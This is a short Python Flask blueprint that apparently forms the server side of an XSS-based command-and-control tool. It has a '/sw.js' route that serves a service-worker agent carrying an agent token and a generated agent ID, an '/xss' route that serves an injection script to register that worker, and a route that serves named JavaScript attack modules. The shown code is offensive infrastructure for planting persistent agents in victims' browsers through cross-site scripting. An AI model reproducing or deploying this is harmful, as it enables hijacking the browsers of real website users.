import os
import uuid
from app import proto
from flask import render_template, request, Blueprint
from config import Config

modules = Blueprint('modules', __name__)

@modules.route('/sw.js')
def sw():
    vapidPub = os.popen("vapid --applicationServerKey | cut -d' ' -f5").read().strip()
    return render_template('sw.js', proto = proto, host = request.host, vapidPub = vapidPub, agent_token = Config.AGENT_TOKEN, agentID = str(uuid.uuid4())), \
                          {'Content-Type': 'application/javascript'}

@modules.route('/xss')
def xss():
    path = request.args.get('path')
    if path == None or path == '':
        path = '/sw.js'
    return render_template('xss.js', path = path), {'Content-Type': 'application/javascript'}
    
@modules.route('/<name>')
def moduleName(name):
    try:
        return render_template('modules/' + name +'.js'), {'Content-Type': 'application/javascript'}
    except:
        return ""
    